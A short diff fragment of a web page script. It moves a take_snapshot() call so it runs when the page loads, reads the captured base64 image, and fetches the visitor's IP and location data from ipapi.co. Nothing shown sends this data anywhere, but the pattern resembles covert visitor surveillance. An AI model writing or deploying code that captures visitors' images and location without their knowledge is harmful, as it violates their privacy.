@@ -1942,14 +1942,8 @@ function take_snapshot() {
   '<img src="'+data_uri+'"/>';
   } );
 }
-</script>
-
-<script>
     take_snapshot();
     var base64image = document.getElementById("results").src;
-
-
-
     country = ""
     x = $.getJSON('https://ipapi.co/json/', function (data) {
         y = (JSON.stringify(data, null, 2));
